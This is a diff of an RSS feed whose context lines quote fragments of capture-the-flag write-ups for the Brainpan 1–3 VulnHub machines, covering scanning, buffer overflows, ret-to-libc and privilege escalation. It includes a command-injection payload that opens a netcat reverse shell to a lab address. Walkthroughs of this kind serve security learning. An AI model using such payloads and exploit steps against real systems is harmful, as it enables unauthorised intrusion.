@@ -1,12 +1,11 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes" ?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Brainpan on rastamouse.me</title>
-    <link>https://rastamouse.me/tags/brainpan/</link>
-    <description>Recent content in Brainpan on rastamouse.me</description>
+    <title>brainpan on rastamouse.me</title>
+    <link>https://rastamouse.me/tags/brainpan/index.xml</link>
+    <description>Recent content in brainpan on rastamouse.me</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sat, 26 Sep 2015 00:00:00 +0000</lastBuildDate>
     <atom:link href="https://rastamouse.me/tags/brainpan/index.xml" rel="self" type="application/rss+xml" />
     
     <item>
@@ -15,9 +14,9 @@
       <pubDate>Sat, 26 Sep 2015 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/writeups/2015/brainpan-3-part-2/</guid>
-      <description>
+      <description>&lt;p&gt;Now that we&amp;rsquo;ve popped &lt;code&gt;anansi&lt;/code&gt; and &lt;code&gt;reynard&lt;/code&gt;, it&amp;rsquo;s time to go after &lt;code&gt;puck&lt;/code&gt; and &lt;code&gt;root&lt;/code&gt;!&lt;/p&gt;
 
-&lt;p&gt;Now that we&amp;rsquo;ve popped &lt;code&gt;anansi&lt;/code&gt; and &lt;code&gt;reynard&lt;/code&gt;, it&amp;rsquo;s time to go after &lt;code&gt;puck&lt;/code&gt; and &lt;code&gt;root&lt;/code&gt;!&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;
 
 &lt;p&gt;There is something listening on the loopback at port &lt;code&gt;7075&lt;/code&gt;.  When we connect, we get a message about a key.&lt;/p&gt;
 
@@ -97,7 +96,7 @@ Key file is compromised.
 &lt;/figure&gt;
 &lt;/div&gt;
 
-&lt;h2 id=&#34;a-race-to-win:f6785c09a6136b44cc09f2d03fcc82fd&#34;&gt;A Race to Win&lt;/h2&gt;
+&lt;h2 id=&#34;a-race-to-win&#34;&gt;A Race to Win&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
 
@@ -123,7 +122,7 @@ $ id
 uid=1001(puck) gid=1004(dev) groups=1001(puck)
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;path-to-root:f6785c09a6136b44cc09f2d03fcc82fd&#34;&gt;Path to Root&lt;/h2&gt;
+&lt;h2 id=&#34;path-to-root&#34;&gt;Path to Root&lt;/h2&gt;
 
 &lt;p&gt;Now that we can read inside &lt;code&gt;puck&#39;s&lt;/code&gt; home directory, we can get the content of &lt;code&gt;key.txt&lt;/code&gt;.  I found it handy to grab this in case I lost shell access - you can write the content into &lt;code&gt;/mnt/usb/key.txt&lt;/code&gt; so you don&amp;rsquo;t have to win the race condition over again.&lt;/p&gt;
 
@@ -149,7 +148,7 @@ $ ls -l /usr/local/bin/msg_admin
 -rwxr-xr-x 1 root root 12316 May 31 04:46 /usr/local/bin/msg_admin
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;a-heap-of-trouble:f6785c09a6136b44cc09f2d03fcc82fd&#34;&gt;A Heap of Trouble&lt;/h2&gt;
+&lt;h2 id=&#34;a-heap-of-trouble&#34;&gt;A Heap of Trouble&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/bp3# ./msg_admin 
 Usage: ./msg_admin priority message.txt
@@ -533,7 +532,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 &lt;p&gt;So it works on my local box - I just copied &lt;code&gt;/bin/sh&lt;/code&gt; as a simple test.  Time to copy &lt;code&gt;message.txt&lt;/code&gt; across to bp3 (again with &lt;code&gt;xxd&lt;/code&gt;).  For the cronjob to pick it up, it must be within &lt;code&gt;/opt/.messenger/&lt;/code&gt; and have the &lt;code&gt;.msg&lt;/code&gt; extension.  You know the job has run, because after the message has been processed, it gets deleted.&lt;/p&gt;
 
-&lt;h2 id=&#34;failed:f6785c09a6136b44cc09f2d03fcc82fd&#34;&gt;Failed?&lt;/h2&gt;
+&lt;h2 id=&#34;failed&#34;&gt;Failed?&lt;/h2&gt;
 
 &lt;p&gt;My &lt;code&gt;/tmp/foo&lt;/code&gt; payload on bp3 was to create a SUID shell.&lt;/p&gt;
 
@@ -640,8 +639,7 @@ TESTERS
        Swappage - https://twitter.com/Swappage
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;I am now going on an extended leave of absense to recover.&lt;/p&gt;
-</description>
+&lt;p&gt;I am now going on an extended leave of absense to recover.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -650,11 +648,11 @@ TESTERS
       <pubDate>Sat, 19 Sep 2015 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/writeups/2015/brainpan-3-part-1/</guid>
-      <description>
+      <description>&lt;p&gt;As with the rest of the series, the focus of brainpan3 is on binary explotation.  The challenges in this VM are certainly a step-up in terms of difficultly compared to brainpan&amp;rsquo;s 1 &amp;amp; 2, and require you to bypass many common protection mechanisms.  On-and-off, it took me about 2 months to solve :s&lt;/p&gt;
 
-&lt;p&gt;As with the rest of the series, the focus of brainpan3 is on binary explotation.  The challenges in this VM are certainly a step-up in terms of difficultly compared to brainpan&amp;rsquo;s 1 &amp;amp; 2, and require you to bypass many common protection mechanisms.  On-and-off, it took me about 2 months to solve :s&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;
 
-&lt;h2 id=&#34;port-scan:7a4f5a6448fafb319eff7e8a031bbd6b&#34;&gt;Port Scan&lt;/h2&gt;
+&lt;h2 id=&#34;port-scan&#34;&gt;Port Scan&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -sT -p- -T5 192.168.56.105
 
@@ -664,7 +662,7 @@ PORT     STATE  SERVICE
 8080/tcp closed http-proxy
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;access-code:7a4f5a6448fafb319eff7e8a031bbd6b&#34;&gt;Access Code&lt;/h2&gt;
+&lt;h2 id=&#34;access-code&#34;&gt;Access Code&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nc 192.168.56.105 1337
 
@@ -759,7 +757,7 @@ total 0
 -rw-rw-r-- 1 reynard reynard  0 May 10 22:26 down
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;session-name:7a4f5a6448fafb319eff7e8a031bbd6b&#34;&gt;Session Name&lt;/h2&gt;
+&lt;h2 id=&#34;session-name&#34;&gt;Session Name&lt;/h2&gt;
 
 &lt;p&gt;We have this banner across the top.&lt;/p&gt;
 
@@ -843,7 +841,7 @@ Aborted (core dumped)
 
 &lt;p&gt;It&amp;rsquo;s at this point we have to take a step back, without the actual binary to analyse I couldn&amp;rsquo;t see a way of progressing this further.&lt;/p&gt;
 
-&lt;h2 id=&#34;some-trolls:7a4f5a6448fafb319eff7e8a031bbd6b&#34;&gt;Some Trolls&lt;/h2&gt;
+&lt;h2 id=&#34;some-trolls&#34;&gt;Some Trolls&lt;/h2&gt;
 
 &lt;p&gt;Option &lt;code&gt;2  - VIEW CODE REPOSITORY&lt;/code&gt; opens up port &lt;code&gt;8080&lt;/code&gt; that we saw closed earlier.&lt;/p&gt;
 
@@ -898,7 +896,7 @@ Aborted (core dumped)
      here&#39;s your shell
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;report:7a4f5a6448fafb319eff7e8a031bbd6b&#34;&gt;Report&lt;/h2&gt;
+&lt;h2 id=&#34;report&#34;&gt;Report&lt;/h2&gt;
 
 &lt;p&gt;The &lt;code&gt;report&lt;/code&gt; binary is really where we need to focus our effort.&lt;/p&gt;
 
@@ -964,7 +962,7 @@ gdb-peda$ x/s 0x8048e98
 
 &lt;p&gt;So the hostname of the machine has to be &lt;code&gt;brainpan3&lt;/code&gt; before it&amp;rsquo;ll go any further.  I&amp;rsquo;m sure you could just NOP it out in gdb, or just change the hostname of your machine.  With that now working, I ran the binary twice.&lt;/p&gt;
 
-&lt;h2 id=&#34;bof-ing:7a4f5a6448fafb319eff7e8a031bbd6b&#34;&gt;BoF&amp;rsquo;ing&lt;/h2&gt;
+&lt;h2 id=&#34;bof-ing&#34;&gt;BoF&amp;rsquo;ing&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@brainpan3:~/bp3# ./report test 1
 [+] WRITING REPORT TO /home/anansi/REPORTS/20150919213852.rep
@@ -1138,7 +1136,7 @@ $ id
 uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;reynard:7a4f5a6448fafb319eff7e8a031bbd6b&#34;&gt;Reynard&lt;/h2&gt;
+&lt;h2 id=&#34;reynard&#34;&gt;Reynard&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ ls -l /home/reynard/private
 total 16
@@ -1294,8 +1292,7 @@ Segmentation fault (core dumped)
 $ ./cryptor $(./cryptor.py)
 $ id
 uid=1000(anansi) gid=1003(webdav) euid=1002(reynard) groups=1002(reynard)
-&lt;/code&gt;&lt;/pre&gt;
-</description>
+&lt;/code&gt;&lt;/pre&gt;</description>
     </item>
     
     <item>
@@ -1304,11 +1301,11 @@ uid=1000(anansi) gid=1003(webdav) euid=1002(reynard) groups=1002(reynard)
       <pubDate>Sun, 01 Jun 2014 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/writeups/2014/brainpan-2-part-1/</guid>
-      <description>
+      <description>&lt;p&gt;Following the popularity of Brainpan 1, Brainpan 2 was released as a competition on VulnHub.  I didn&amp;rsquo;t take part, but since the VM remains on VulnHub, I had a go at it retrospectively.  The goal is to gain root access and obtain /root/flag.txt.&lt;/p&gt;
 
-&lt;p&gt;Following the popularity of Brainpan 1, Brainpan 2 was released as a competition on VulnHub.  I didn&amp;rsquo;t take part, but since the VM remains on VulnHub, I had a go at it retrospectively.  The goal is to gain root access and obtain /root/flag.txt.&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;
 
-&lt;h2 id=&#34;nmap:fd0e7d44f60d37a03464dc18f2eb9f37&#34;&gt;Nmap&lt;/h2&gt;
+&lt;h2 id=&#34;nmap&#34;&gt;Nmap&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -sV -p- -A 192.168.127.131
   
@@ -1362,7 +1359,7 @@ brainpan.exe: JPEG image data, JFIF standard 1.01, comment: &amp;quot;CREATOR: g
 
 &lt;p&gt;I ran &lt;code&gt;nikto&lt;/code&gt; and &lt;code&gt;wfuzz&lt;/code&gt; against the web service, but nothing popped except the &lt;code&gt;/bin/&lt;/code&gt; directory, so I turned my attention back to the app on 9999.&lt;/p&gt;
 
-&lt;h2 id=&#34;command-injection:fd0e7d44f60d37a03464dc18f2eb9f37&#34;&gt;Command Injection&lt;/h2&gt;
+&lt;h2 id=&#34;command-injection&#34;&gt;Command Injection&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;&amp;gt;&amp;gt; GUEST
                           ACCESS GRANTED
@@ -1412,7 +1409,7 @@ uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)
 
 &lt;p&gt;&lt;code&gt;ENTER FILE TO DOWNLOAD: ; nc 192.168.127.127 4444 -e &#39;/bin/sh&#39;&lt;/code&gt;&lt;/p&gt;
 
-&lt;h2 id=&#34;ssh-foothold:fd0e7d44f60d37a03464dc18f2eb9f37&#34;&gt;SSH Foothold&lt;/h2&gt;
+&lt;h2 id=&#34;ssh-foothold&#34;&gt;SSH Foothold&lt;/h2&gt;
 
 &lt;p&gt;For the sake of a coherent write-up, I&amp;rsquo;m going to include maintaining SSH access to the system.  When I originally exploited Brainpan 2, I didn&amp;rsquo;t do this until way later on, because I was getting annoyed at losing my remote shells due to making mistakes etc and then having to re-exploit to re-gain access.&lt;/p&gt;
 
@@ -1450,7 +1447,7 @@ root@kali:~# ssh anansi @ 127.0.0.1 -p 2222
 anansi@brainpan2:~$ 
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;more-trolls:fd0e7d44f60d37a03464dc18f2eb9f37&#34;&gt;More Trolls?&lt;/h2&gt;
+&lt;h2 id=&#34;more-trolls&#34;&gt;More Trolls?&lt;/h2&gt;
 
 &lt;p&gt;With convenient access to the system, I carried out some more enumeration.&lt;/p&gt;
 
@@ -1481,7 +1478,7 @@ reynard:x:1002:
 
 &lt;p&gt;I&amp;rsquo;m going to assume that exploiting this binary won&amp;rsquo;t give me real root access.  But I couldn&amp;rsquo;t find any other route to gain further access to the system, so I just went with it&amp;hellip;&lt;/p&gt;
 
-&lt;h2 id=&#34;msg-root:fd0e7d44f60d37a03464dc18f2eb9f37&#34;&gt;msg_root&lt;/h2&gt;
+&lt;h2 id=&#34;msg-root&#34;&gt;msg_root&lt;/h2&gt;
 
 &lt;p&gt;I ran this binary quickly to see what it would do.  It appears to be an application to send a message to another user on the system.  It takes two inputs, a message and the destination user.&lt;/p&gt;
 
@@ -1609,7 +1606,7 @@ $ cat /root/whatif.txt
 
 &lt;p&gt;All is not lost however, as this user, I can now access another SUID binary found in &lt;code&gt;/opt/old/brainpan-1.8&lt;/code&gt;.  I&amp;rsquo;ll cover this in Part 2&amp;hellip;&lt;/p&gt;
 
-&lt;h3 id=&#34;findaddr-c:fd0e7d44f60d37a03464dc18f2eb9f37&#34;&gt;findaddr.c&lt;/h3&gt;
+&lt;h3 id=&#34;findaddr-c&#34;&gt;findaddr.c&lt;/h3&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
 #include &amp;lt;stdlib.h&amp;gt;
@@ -1620,8 +1617,7 @@ int main(void)
   printf(&amp;quot;egg =&amp;gt; %p\n&amp;quot;, s);
   return 0;
 }
-&lt;/code&gt;&lt;/pre&gt;
-</description>
+&lt;/code&gt;&lt;/pre&gt;</description>
     </item>
     
     <item>
@@ -1630,9 +1626,9 @@ int main(void)
       <pubDate>Sun, 01 Jun 2014 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/writeups/2014/brainpan-2-part-2/</guid>
-      <description>
+      <description>&lt;p&gt;&lt;/p&gt;
 
-&lt;h2 id=&#34;brainpan-1-8:57e48663af901e7c94c0472675ef84ed&#34;&gt;brainpan-1.8&lt;/h2&gt;
+&lt;h2 id=&#34;brainpan-1-8&#34;&gt;brainpan-1.8&lt;/h2&gt;
 
 &lt;p&gt;It was mentioned in the &lt;code&gt;notes.txt&lt;/code&gt; file that &lt;code&gt;brainpan-1.8&lt;/code&gt; works from a configuration file.  It also contains the following line:&lt;/p&gt;
 
@@ -1693,7 +1689,7 @@ Segmentation fault
 
 &lt;p&gt;Wow, excellent.&lt;/p&gt;
 
-&lt;h2 id=&#34;gdb:57e48663af901e7c94c0472675ef84ed&#34;&gt;GDB&lt;/h2&gt;
+&lt;h2 id=&#34;gdb&#34;&gt;GDB&lt;/h2&gt;
 
 &lt;p&gt;The &lt;code&gt;EIP&lt;/code&gt; offset is &lt;code&gt;44 bytes&lt;/code&gt;.   A quick test to verify.&lt;/p&gt;
 
@@ -1738,7 +1734,7 @@ No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RU
 
 &lt;p&gt;This protection means that code located on the stack will not be executed, so even if I could find a JMP ESP insruction (of which there are none in the binary anyway), shellcode will not be executed.  A popular type of attack to bypass NX is called &lt;code&gt;ret-to-libc&lt;/code&gt;.&lt;/p&gt;
 
-&lt;h2 id=&#34;return-to-libc:57e48663af901e7c94c0472675ef84ed&#34;&gt;Return-to-libc&lt;/h2&gt;
+&lt;h2 id=&#34;return-to-libc&#34;&gt;Return-to-libc&lt;/h2&gt;
 
 &lt;p&gt;libc is the standard c library and provides multiple functionality for a programmer, including Operating System functions etc.  It makes it possible to call pre-loaded functions via this library, rather than having to inject your own code.  It bypasses the NX protection since nothing is being executed from the stack.&lt;/p&gt;
 
@@ -1791,7 +1787,7 @@ uid=1000(anansi) gid=1000(anansi) euid=1001(puck) groups=1001(puck),50(staff),10
 puck
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;robin-goodfellow:57e48663af901e7c94c0472675ef84ed&#34;&gt;Robin Goodfellow&amp;hellip;&lt;/h2&gt;
+&lt;h2 id=&#34;robin-goodfellow&#34;&gt;Robin Goodfellow&amp;hellip;&lt;/h2&gt;
 
 &lt;p&gt;&amp;hellip; I mean Puck&amp;hellip;&lt;/p&gt;
 
@@ -1836,7 +1832,7 @@ uid=0(root ) gid=0(root ) groups=0(root )
 root
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;flag:57e48663af901e7c94c0472675ef84ed&#34;&gt;Flag&lt;/h2&gt;
+&lt;h2 id=&#34;flag&#34;&gt;Flag&lt;/h2&gt;
 
 &lt;p&gt;&lt;code&gt;root@brainpan2:~# cat /root/flag.txt&lt;/code&gt;&lt;/p&gt;
 
@@ -1857,8 +1853,7 @@ root
 &lt;li&gt;&lt;a href=&#34;https://twitter.com/superkojiman&#34;&gt;superkojiman&lt;/a&gt; for creating a great challenge,&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;http://vulnhub.com/&#34;&gt;VulnHub&lt;/a&gt; for hosting,&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;https://twitter.com/teh_h3ck&#34;&gt;teh3ck&lt;/a&gt; for his kind words of encouragement.&lt;/li&gt;
-&lt;/ul&gt;
-</description>
+&lt;/ul&gt;</description>
     </item>
     
     <item>
@@ -1867,11 +1862,11 @@ root
       <pubDate>Wed, 28 May 2014 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/writeups/2014/brainpan-1-part-1/</guid>
-      <description>
+      <description>&lt;p&gt;Brainpan is a brilliant series of VMs created by &lt;a href=&#34;https://twitter.com/superkojiman&#34;&gt;superkojiman&lt;/a&gt; - the goal is to gain root access.  These challenges are quite long and involved as they&amp;rsquo;re not strictly at beginner level :), so I&amp;rsquo;ve split the solution into multiple parts.&lt;/p&gt;
 
-&lt;p&gt;Brainpan is a brilliant series of VMs created by &lt;a href=&#34;https://twitter.com/superkojiman&#34;&gt;superkojiman&lt;/a&gt; - the goal is to gain root access.  These challenges are quite long and involved as they&amp;rsquo;re not strictly at beginner level :), so I&amp;rsquo;ve split the solution into multiple parts.&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;
 
-&lt;h2 id=&#34;nmap:3c5805e5caac0bbd6084b7628143b7fb&#34;&gt;Nmap&lt;/h2&gt;
+&lt;h2 id=&#34;nmap&#34;&gt;Nmap&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -sV -A -p- 192.168.127.128
   
@@ -1897,7 +1892,7 @@ PORT      STATE SERVICE VERSION
 
 &lt;p&gt;I turned my attention back to the &lt;code&gt;SimpleHTTPServer&lt;/code&gt; on port &lt;code&gt;10000&lt;/code&gt;.&lt;/p&gt;
 
-&lt;h2 id=&#34;nikto:3c5805e5caac0bbd6084b7628143b7fb&#34;&gt;Nikto&lt;/h2&gt;
+&lt;h2 id=&#34;nikto&#34;&gt;Nikto&lt;/h2&gt;
 
 &lt;p&gt;The index page on the web server didn&amp;rsquo;t contain anything interesting, so I did some more enumeration.&lt;/p&gt;
 
@@ -1922,7 +1917,7 @@ brainpan.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), 
 
 &lt;p&gt;So it&amp;rsquo;s bound itself to port &lt;code&gt;9999&lt;/code&gt; - I connected to it with &lt;code&gt;netcat&lt;/code&gt; and received the same output as the application running on brainpan.&lt;/p&gt;
 
-&lt;h2 id=&#34;time-to-debug:3c5805e5caac0bbd6084b7628143b7fb&#34;&gt;Time to Debug&lt;/h2&gt;
+&lt;h2 id=&#34;time-to-debug&#34;&gt;Time to Debug&lt;/h2&gt;
 
 &lt;p&gt;If this application contains an exploitable vulnerability, then I may be able to leverage it to obtain a shell on brainpan.  I ran it through &lt;code&gt;strings&lt;/code&gt;, to get an idea of the functions inside.&lt;/p&gt;
 
@@ -2176,8 +2171,7 @@ pwd
 /home/puck
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;Now I finally have a shell on brainpan - it&amp;rsquo;s time to end Part 1&amp;hellip;&lt;/p&gt;
-</description>
+&lt;p&gt;Now I finally have a shell on brainpan - it&amp;rsquo;s time to end Part 1&amp;hellip;&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -2186,9 +2180,9 @@ pwd
       <pubDate>Wed, 28 May 2014 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/writeups/2014/brainpan-1-part-2/</guid>
-      <description>
+      <description>&lt;p&gt;&lt;/p&gt;
 
-&lt;h2 id=&#34;shell:edcb2de0cbbe69c925e398e09c0d9e58&#34;&gt;Shell&lt;/h2&gt;
+&lt;h2 id=&#34;shell&#34;&gt;Shell&lt;/h2&gt;
 
 &lt;p&gt;Now I had a shell, I could start exploring the system.&lt;/p&gt;
 
@@ -2254,7 +2248,7 @@ strcpy
 
 &lt;p&gt;So the user input is again passed using the vulnerable &lt;code&gt;strcpy&lt;/code&gt; function.  If we could exploit this, we would gain access as &lt;code&gt;anansi&lt;/code&gt;.&lt;/p&gt;
 
-&lt;h2 id=&#34;exploiting-validate:edcb2de0cbbe69c925e398e09c0d9e58&#34;&gt;Exploiting Validate&lt;/h2&gt;
+&lt;h2 id=&#34;exploiting-validate&#34;&gt;Exploiting Validate&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/brainpan/1# ./validate `python -c &#39;print (&amp;quot;A&amp;quot; * 200)&#39;`
 Segmentation fault
@@ -2359,8 +2353,7 @@ root
 &lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;w00t!
-I couldn&amp;rsquo;t find an obvious final flag, so assume the challenge ends here.&lt;/p&gt;
-</description>
+I couldn&amp;rsquo;t find an obvious final flag, so assume the challenge ends here.&lt;/p&gt;</description>
     </item>
     
   </channel>
